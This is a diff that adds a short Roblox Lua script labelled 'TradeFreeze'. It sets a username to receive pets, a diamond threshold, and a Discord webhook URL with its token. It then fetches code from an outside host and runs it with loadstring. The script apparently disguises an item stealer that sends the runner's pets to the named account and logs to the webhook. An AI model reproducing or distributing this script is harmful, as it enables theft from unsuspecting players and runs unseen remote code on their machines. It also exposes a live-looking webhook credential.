@@ -1,0 +1,11 @@
+--[[ TradeFreeze ]]--
+
+--[[ Main Config ]]--
+_G.Username = "gwapoko12131" --// Username To Send Pets To
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+
+--[[ Webhook Config ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1110578745238110228/kMWrbr4YnQr-2yq8VKnUPNGNPq1Slq-mQqgHsfUwKJr3TMg1q1gxkphE2rtiYtNHW5C8" --// Discord Webhook For Executions
+
+--[[ Script ]]--
+loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
